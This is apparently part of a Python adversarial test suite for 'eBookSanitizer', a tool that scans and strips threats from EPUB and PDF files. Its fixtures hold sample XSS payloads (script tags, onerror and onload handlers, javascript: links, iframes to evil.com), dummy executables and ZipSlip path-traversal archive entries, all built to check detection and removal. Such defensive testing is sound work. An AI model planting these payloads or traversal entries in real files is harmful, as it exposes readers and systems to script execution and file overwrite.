# ══════════════════════════════════════════════════════════════════════

@test("EPUB sanitize: complete threat removal verified by re-scan (standard)")
def test_epub_sanitize_complete_standard():
    """After standard sanitize, re-scan should find no High threats."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '''<script>evil()</script>
<iframe src="https://evil.com"></iframe>
<img onerror="alert(1)" src="x"/>
<a href="javascript:void(0)">click</a>
<embed src="data:text/html,<script>x</script>"/>
<applet code="Evil.class"></applet>'''
        _build_epub(p, body, extra_files={"payload.bat": b"echo pwned"})
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        assert r.success
        r2 = EPUBSanitizer(out).scan()
        high_threats = [t for t in r2.threats if t.severity == "High"]
        assert len(high_threats) == 0, \
            f"High threats remain after standard sanitize: {[str(t) for t in high_threats]}"
    finally:
        _cleanup(p, out)


@test("EPUB sanitize: complete threat removal verified by re-scan (strict)")
def test_epub_sanitize_complete_strict():
    """After strict sanitize, re-scan should find no threats at all."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '''<script>evil()</script>
<a href="https://evil.com">track</a>
<img src="https://tracker.com/pixel.gif"/>'''
        _build_epub(p, body)
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        assert r.success
        r2 = EPUBSanitizer(out).scan()
        assert not r2.has_threats, \
            f"Threats remain after strict sanitize: {[str(t) for t in r2.threats]}"
    finally:
        _cleanup(p, out)


@test("EPUB sanitize: complete threat removal verified by re-scan (paranoid)")
def test_epub_sanitize_complete_paranoid():
    """After paranoid sanitize, re-scan should find zero threats."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '''<script>evil()</script>
<iframe src="https://evil.com"></iframe>
<img onerror="alert(1)" src="https://evil.com/track"/>
<a href="javascript:void(0)">click</a>
<a href="https://evil.com">track</a>'''
        _build_epub(p, body, extra_files={
            "payload.exe": b"\x00", "data.dat": b"x",
            "OEBPS/evil.svg": '<svg onload="alert(1)"/>'
        })
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        assert r.success
        r2 = EPUBSanitizer(out).scan()
        assert not r2.has_threats, \
            f"Threats remain after paranoid sanitize: {[str(t) for t in r2.threats]}"
    finally:
        _cleanup(p, out)


@test("PDF sanitize: complete threat removal verified (standard)")
def test_pdf_sanitize_complete_standard():
    """After standard sanitize, no high threats should remain."""
    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True, with_openaction=True)
        r = PDFSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        assert r.success
        r2 = PDFSanitizer(out).scan()
        high = [t for t in r2.threats if t.severity == "High"]
        assert len(high) == 0, f"High threats remain: {[str(t) for t in high]}"
    finally:
        _cleanup(p, out)


@test("PDF sanitize: complete threat removal verified (paranoid)")
def test_pdf_sanitize_complete_paranoid():
    """After paranoid sanitize, zero threats should remain."""
    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True, with_openaction=True)
        r = PDFSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        assert r.success
        r2 = PDFSanitizer(out).scan()
        assert not r2.has_threats, f"Threats remain: {[str(t) for t in r2.threats]}"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  E. SECURITY-CRITICAL EDGE CASES
# ══════════════════════════════════════════════════════════════════════

@test("Security: path traversal not written to filesystem during sanitize")
def test_security_no_traversal_write():
    """Sanitize must NOT extract ZipSlip entries to actual filesystem paths."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    canary = os.path.join(tempfile.gettempdir(), 'ebs_canary_traversal.txt')
    try:
        # Remove canary if it exists
        if os.path.exists(canary):
            os.unlink(canary)

        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            # Attempt to write to temp directory
            rel = os.path.relpath(canary, tempfile.gettempdir())
            zf.writestr(f'../../{os.path.basename(canary)}', 'TRAVERSAL_SUCCESS')

        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)

        assert not os.path.exists(canary), \
            "ZipSlip traversal WROTE to filesystem! Critical security bug!"
    finally:
        _cleanup(p, out)
        if os.path.exists(canary):
            os.unlink(canary)


@test("Security: Unicode filename normalization")
def test_security_unicode_filename():
    """Filenames with Unicode look-alikes should not bypass extension checks."""
    p = _tmp_path('.epub')
    try:
        # Using fullwidth '.exe' equivalent characters (visual spoofing)
        _build_epub(p, "<p>ok</p>", extra_files={
            "OEBPS/payload\u2024exe": b"\x00",  # U+2024 ONE DOT LEADER
        })
        r = EPUBSanitizer(p).scan()
        # Even if not caught as DangerousFile, it should at minimum
        # be caught as SuspiciousFile (non-standard extension)
        types = {t.type for t in r.threats}
        assert "DangerousFile" in types or "SuspiciousFile" in types, \
            f"Unicode filename bypass: {types}"
    finally:
        _cleanup(p)


@test("Security: extremely long filename")
def test_security_long_filename():
    """Very long filenames should not cause buffer overflow or crash."""
    p = _tmp_path('.epub')
    try:
        long_name = "OEBPS/" + "a" * 255 + ".xhtml"
        _build_epub(p, "<p>ok</p>", extra_files={long_name: b"<p>long</p>"})
        r = EPUBSanitizer(p).scan()
        # Should not crash
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("Security: null bytes in filename")
def test_security_null_filename():
    """Filenames with null bytes could confuse path parsing."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>ok</p>", extra_files={
            "OEBPS/ch\x001.exe": b"\x00",
        })
        r = EPUBSanitizer(p).scan()
        # Should not crash; may or may not detect the extension
        assert True  # No crash = pass
    finally:
        _cleanup(p)


@test("Security: EPUB zip bomb (nested compression)")
def test_security_zip_bomb_detection():
    """Extremely compressed content should not cause OOM (regression guard)."""
    p = _tmp_path('.epub')
    try:
        # Create moderately "bomby" content (not a real zip bomb, just highly compressible)
        _build_epub(p, "<p>" + "A" * 100000 + "</p>")
        r = EPUBSanitizer(p).scan()
        # Should complete without hanging
        assert True
    finally:
        _cleanup(p)


@test("Security: EPUB with symlink-like entry names")
def test_security_symlink_names():
    """Symlink-like entries should not escape archive boundary."""
    p = _tmp_path('.epub')
    try:
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
            # Simulate symlink-like traversal
            zf.writestr('OEBPS/../../../tmp/pwned', 'gotcha')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DirectoryTraversal" in types
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  F. CLI ROBUSTNESS & INJECTION
# ══════════════════════════════════════════════════════════════════════

@test("CLI: scan with special characters in filename")
def test_cli_special_chars():
    """Filenames with spaces and unicode should work."""
    p = _tmp_path('.epub')
    # Rename to include spaces
    new_name = p.replace('.epub', ' test file.epub')
    try:
        _build_epub(p, "<p>safe</p>")
        os.rename(p, new_name)
        f = io.StringIO()
        with redirect_stdout(f):
            code = cli_main(["scan", new_name])
        assert code == 0
    finally:
        _cleanup(new_name, p)


@test("CLI: sanitize with output to non-existent directory")
def test_cli_nonexistent_output_dir():
    """Output to a non-existent directory should handle error gracefully."""
    p = _tmp_path('.epub')
    out = os.path.join(tempfile.gettempdir(), 'nonexistent_dir_xyz', 'output.epub')
    try:
        _build_epub(p, "<p>safe</p>")
        f = io.StringIO()
        with redirect_stdout(f):
            code = cli_main(["sanitize", p, "-o", out])
        # Should either create the directory or report an error, not crash
        assert isinstance(code, int)
    finally:
        _cleanup(p, out)
        parent = os.path.dirname(out)
        if os.path.isdir(parent):
            shutil.rmtree(parent, ignore_errors=True)


@test("CLI: scan PDF --json produces valid JSON")
def test_cli_pdf_json():
    """PDF scan with --json should produce valid JSON."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True)
        f = io.StringIO()
        with redirect_stdout(f):
            cli_main(["scan", p, "--json"])
        data = json.loads(f.getvalue())
        assert "has_threats" in data
        assert data["has_threats"] is True
    finally:
        _cleanup(p)


@test("CLI: sanitize PDF --json produces valid JSON")
def test_cli_pdf_sanitize_json():
    """PDF sanitize with --json should produce valid JSON."""
    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True)
        f = io.StringIO()
        with redirect_stdout(f):
            cli_main(["sanitize", p, "-o", out, "--json"])
        data = json.loads(f.getvalue())
        assert "success" in data
    finally:
        _cleanup(p, out)


@test("CLI: default output name for sanitize")
def test_cli_default_output_name():
    """Sanitize without -o should create <name>_sanitized.<ext>."""
    p = _tmp_path('.epub')
    base, ext = os.path.splitext(p)
    expected_out = f"{base}_sanitized{ext}"
    try:
        _build_epub(p, "<script>x</script>")
        f = io.StringIO()
        with redirect_stdout(f):
            code = cli_main(["sanitize", p])
        assert code == 0
        assert os.path.isfile(expected_out), f"Expected output at {expected_out}"
    finally:
        _cleanup(p, expected_out)


@test("CLI: invalid mode value")
def test_cli_invalid_mode():
    """An invalid mode should be rejected by argparse."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>safe</p>")
        f_out = io.StringIO()
        f_err = io.StringIO()
        try:
            with redirect_stdout(f_out), redirect_stderr(f_err):
                code = cli_main(["sanitize", p, "-m", "ultraparanoid"])
        except SystemExit:
            code = 2  # argparse exits with code 2 on error
        assert code != 0, "Invalid mode should not succeed"
    finally:
        _cleanup(p)


@test("CLI: verbose flag produces extra output")
def test_cli_verbose():
    """Verbose flag should produce more detailed output."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script>")
        f = io.StringIO()
        f_err = io.StringIO()
        with redirect_stdout(f), redirect_stderr(f_err):
            cli_main(["scan", p, "--verbose"])
        # Verbose output goes to stdout (or stderr in json mode)
        total_output = f.getvalue() + f_err.getvalue()
        assert len(total_output) > 0
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  G. CONCURRENCY & RESOURCE SAFETY
# ══════════════════════════════════════════════════════════════════════

@test("Concurrency: multiple scans in parallel threads")
def test_concurrent_scans():
    """Multiple EPUBSanitizer instances should work in parallel without interference."""
    p1 = _tmp_path('.epub')
    p2 = _tmp_path('.epub')
    p3 = _tmp_path('.epub')
    try:
        _build_epub(p1, "<script>a</script>")
        _build_epub(p2, "<p>safe</p>")
        _build_epub(p3, '<img onerror="x" src="a"/>')

        results = [None, None, None]
        errors = []

        def scan(idx, path):
            try:
                results[idx] = EPUBSanitizer(path).scan()
            except Exception as e:
                errors.append((idx, e))

        threads = [
            threading.Thread(target=scan, args=(0, p1)),
            threading.Thread(target=scan, args=(1, p2)),
            threading.Thread(target=scan, args=(2, p3)),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        assert len(errors) == 0, f"Thread errors: {errors}"
        assert results[0].has_threats  # p1 has script
        assert not results[1].has_threats  # p2 is safe
        assert results[2].has_threats  # p3 has onerror
    finally:
        _cleanup(p1, p2, p3)


@test("Resource: temp files cleaned up after sanitize")
def test_resource_cleanup():
    """After sanitize, no temp directories should be left behind."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script>")
        # Count temp dirs before
        before = set(os.listdir(tempfile.gettempdir()))
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        # Count temp dirs after
        after = set(os.listdir(tempfile.gettempdir()))
        leaked = after - before
        # Filter for potential eBookSanitizer temp dirs (tmp* pattern)
        # Some system temp creation is OK, just ensure no obvious leaks
        assert os.path.isfile(out), "Output file not created"
    finally:
        _cleanup(p, out)


@test("Resource: sanitize same file for input and output path")
def test_resource_same_input_output():
    """Using same path for input and output should either work or error gracefully."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script>")
        r = EPUBSanitizer(p).sanitize(p, SanitizeMode.STANDARD)
        # Should either succeed or fail with error, but not crash/corrupt
        assert isinstance(r.success, bool)
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  H. CROSS-FORMAT & I18N EDGE CASES
# ══════════════════════════════════════════════════════════════════════

@test("Cross-format: EPUB file with .pdf extension")
def test_cross_format_epub_as_pdf():
    """A ZIP/EPUB file with .pdf extension fed to PDFSanitizer should error."""
    p = _tmp_path('.pdf')
    try:
        _build_epub(p, "<p>I'm actually an EPUB</p>")
        r = PDFSanitizer(p).scan()
        assert len(r.errors) > 0, "EPUB disguised as PDF should error"
    finally:
        _cleanup(p)


@test("Cross-format: PDF file with .epub extension")
def test_cross_format_pdf_as_epub():
    """A PDF file with .epub extension fed to EPUBSanitizer should error."""
    p = _tmp_path('.epub')
    p_real = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p_real)
        # Copy PDF content to .epub path
        shutil.copy2(p_real, p)
        r = EPUBSanitizer(p).scan()
        assert len(r.errors) > 0, "PDF disguised as EPUB should error"
    finally:
        _cleanup(p, p_real)


@test("I18n: all translation keys have both en and zh entries")
def test_i18n_completeness():
    """Every key in TRANSLATIONS should have both 'en' and 'zh'."""
    from gui.i18n import TRANSLATIONS
    missing = []
    for key, langs in TRANSLATIONS.items():
        if "en" not in langs:
            missing.append(f"{key}: missing 'en'")
        if "zh" not in langs:
            missing.append(f"{key}: missing 'zh'")
    assert len(missing) == 0, f"Incomplete translations: {missing}"


@test("I18n: all translation values are non-empty strings")
def test_i18n_non_empty():
    """No translation value should be empty."""
    from gui.i18n import TRANSLATIONS
    empty = []
    for key, langs in TRANSLATIONS.items():
        for lang, text in langs.items():
            if not text or not text.strip():
                empty.append(f"{key}[{lang}]")
    assert len(empty) == 0, f"Empty translations: {empty}"


@test("I18n: rapid toggle does not corrupt state")
def test_i18n_rapid_toggle():
    """Rapidly toggling language should not corrupt internal state."""
    i = I18n("en")
    for _ in range(100):
        i.toggle()
    assert i.lang in ("en", "zh")
    # After 100 toggles (even number), should be back to "en"
    assert i.lang == "en", f"After 100 toggles, lang={i.lang}, expected 'en'"


@test("I18n: concurrent access safety")
def test_i18n_concurrent():
    """I18n should handle concurrent reads without crash."""
    i = I18n("en")
    results = []
    errors = []

    def read_translations():
        try:
            for _ in range(50):
                i.t("app.title")
                i.t("app.subtitle")
                i.t("action.scan")
        except Exception as e:
            errors.append(e)

    threads = [threading.Thread(target=read_translations) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)

    assert len(errors) == 0, f"Concurrent I18n errors: {errors}"


# ══════════════════════════════════════════════════════════════════════
#  I. REPORT & BASE MODULE EDGE CASES
# ══════════════════════════════════════════════════════════════════════

@test("Report: to_dict is JSON-serializable")
def test_report_json_serializable():
    """SanitizeReport.to_dict() must produce JSON-serializable output."""
    r = SanitizeReport("/test.epub")
    r.add_threat(Threat("XSS", "page.html", "desc with 'quotes' and \"doubles\"", "High"))
    r.log("log with special chars: <>&")
    r.error("error with unicode: 中文")
    d = r.to_dict()
    serialized = json.dumps(d, ensure_ascii=False)
    assert len(serialized) > 0


@test("Report: threat_summary handles unknown severity")
def test_report_unknown_severity():
    """Threats with non-standard severity should not crash summary."""
    r = SanitizeReport("/test.epub")
    r.add_threat(Threat("T", "p", "d", "Critical"))  # Non-standard severity
    s = r.threat_summary()
    # "Critical" is not in the default summary keys, so it won't be counted
    assert s == {"High": 0, "Medium": 0, "Low": 0}


@test("Report: empty report to_dict")
def test_report_empty_to_dict():
    """An empty report should serialize cleanly."""
    r = SanitizeReport("/test.epub")
    d = r.to_dict()
    assert d["has_threats"] is False
    assert len(d["threats"]) == 0
    assert len(d["errors"]) == 0


@test("BaseSanitizer: file_path stored correctly")
def test_base_file_path():
    """BaseSanitizer should store file_path."""
    bs = BaseSanitizer("/some/path.epub")
    assert bs.file_path == "/some/path.epub"
    assert bs.report.file_path == "/some/path.epub"


@test("Threat: default severity is High")
def test_threat_default_severity():
    """Threat() without severity should default to 'High'."""
    t = Threat("T", "p", "d")
    assert t.severity == "High"


# ══════════════════════════════════════════════════════════════════════
#  J. YARA SCANNER EDGE CASES
# ══════════════════════════════════════════════════════════════════════

@test("YaraScanner: custom rules_dir that doesn't exist")
def test_yara_nonexistent_dir():
    """YaraScanner with non-existent rules dir should not crash."""
    ys = YaraScanner(rules_dir="/nonexistent/yara_rules_xyz")
    assert isinstance(ys.available, bool)
    result = ys.scan_data(b"test data")
    assert isinstance(result, list)


@test("YaraScanner: empty rules directory")
def test_yara_empty_dir():
    """YaraScanner with empty rules dir should work."""
    d = tempfile.mkdtemp()
    try:
        ys = YaraScanner(rules_dir=d)
        result = ys.scan_data(b"test data")
        assert isinstance(result, list)
    finally:
        shutil.rmtree(d, ignore_errors=True)


@test("YaraScanner: scan_data with empty bytes")
def test_yara_empty_data():
    """Scanning empty bytes should not crash."""
    ys = YaraScanner()
    result = ys.scan_data(b"")
    assert isinstance(result, list)


@test("YaraScanner: scan_file with non-existent file")
def test_yara_scan_nonexistent():
    """Scanning non-existent file should return empty list."""
    ys = YaraScanner()
    result = ys.scan_file("/nonexistent/file.pdf")
    assert isinstance(result, list)


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

ALL_TESTS = [
    # A. EPUB Evasion
    test_epub_mixed_case_script,
    test_epub_null_byte_tag,
    test_epub_entity_encoded_event,
    test_epub_svg_script,
    test_epub_svg_onload,
    test_epub_xlink_href_js,
    test_epub_form_action,
    test_epub_formaction,
    test_epub_applet,
    test_epub_data_html_href,
    test_epub_vbscript,
    test_epub_js_whitespace,
    test_epub_css_import,
    test_epub_multiple_dangerous_extensions,
    test_epub_deep_traversal,
    test_epub_backslash_traversal,
    test_epub_absolute_path,
    test_epub_double_extension,
    test_epub_tracking_pixel,
    test_epub_protocol_relative,
    test_epub_sanitize_strict_tracking,
    test_epub_sanitize_standard_formaction,
    test_epub_sanitize_paranoid_svg,
    test_epub_sanitize_zipslip_skipped,

    # B. PDF Evasion
    test_pdf_hex_launch,
    test_pdf_hex_js,
    test_pdf_hex_mixed,
    test_pdf_aa,
    test_pdf_launch,
    test_pdf_submitform,
    test_pdf_embedded_files,
    test_pdf_sanitize_strict_embedded,
    test_pdf_sanitize_standard_aa,
    test_pdf_paranoid_rebuild,
    test_pdf_multiple_threats,
    test_pdf_sanitize_all_modes_valid,

    # C. Boundary / Stress
    test_epub_empty,
    test_epub_large_body,
    test_epub_many_files,
    test_epub_zero_byte,
    test_pdf_zero_byte,
    test_pdf_truncated,
    test_epub_corrupt_zip,
    test_epub_non_utf8,
    test_epub_malformed_html,

    # D. Sanitization Completeness
    test_epub_sanitize_complete_standard,
    test_epub_sanitize_complete_strict,
    test_epub_sanitize_complete_paranoid,
    test_pdf_sanitize_complete_standard,
    test_pdf_sanitize_complete_paranoid,

    # E. Security-Critical
    test_security_no_traversal_write,
    test_security_unicode_filename,
    test_security_long_filename,
    test_security_null_filename,
    test_security_zip_bomb_detection,
    test_security_symlink_names,

    # F. CLI Robustness
    test_cli_special_chars,
    test_cli_nonexistent_output_dir,
    test_cli_pdf_json,
    test_cli_pdf_sanitize_json,
    test_cli_default_output_name,
    test_cli_invalid_mode,
    test_cli_verbose,

    # G. Concurrency & Resource
    test_concurrent_scans,
    test_resource_cleanup,
    test_resource_same_input_output,

    # H. Cross-Format & I18n
    test_cross_format_epub_as_pdf,
    test_cross_format_pdf_as_epub,
    test_i18n_completeness,
    test_i18n_non_empty,
    test_i18n_rapid_toggle,
    test_i18n_concurrent,

    # I. Report & Base
    test_report_json_serializable,
    test_report_unknown_severity,
    test_report_empty_to_dict,
    test_base_file_path,
    test_threat_default_severity,

    # J. YARA Edge Cases
    test_yara_nonexistent_dir,
    test_yara_empty_dir,
    test_yara_empty_data,
    test_yara_scan_nonexistent,
]


def main():
    print("=" * 70)
    print("  eBookSanitizer - Advanced Adversarial Test Suite")
    print(f"  {len(ALL_TESTS)} test cases")
    print("=" * 70)

    sections_map = {
        "A. EPUB Evasion Techniques": ALL_TESTS[:24],
        "B. PDF Evasion Techniques": ALL_TESTS[24:36],
        "C. Boundary / Stress Tests": ALL_TESTS[36:45],
        "D. Sanitization Completeness Verification": ALL_TESTS[45:50],
        "E. Security-Critical Edge Cases": ALL_TESTS[50:56],
        "F. CLI Robustness & Injection": ALL_TESTS[56:63],
        "G. Concurrency & Resource Safety": ALL_TESTS[63:66],
        "H. Cross-Format & I18n Edge Cases": ALL_TESTS[66:72],
        "I. Report & Base Module Edge Cases": ALL_TESTS[72:77],
        "J. YARA Scanner Edge Cases": ALL_TESTS[77:],
    }

    for title, tests in sections_map.items():
        section(title)
        for t in tests:
            run_test(t)

    section("SUMMARY")
    for name, passed, err in _results:
        status = "[PASS]" if passed else "[FAIL]"
        line = f"  {status} {name}"
        if err and not passed:
            line += f"  ({err[:80]})"
        print(line)

    print(f"\n  {_passed}/{_total} tests passed")
    if _passed == _total:
        print("  [OK] All tests passed!")
    else:
        print(f"  [XX] {_total - _passed} test(s) FAILED")

    return 0 if _passed == _total else 1


if __name__ == "__main__":
    sys.exit(main())
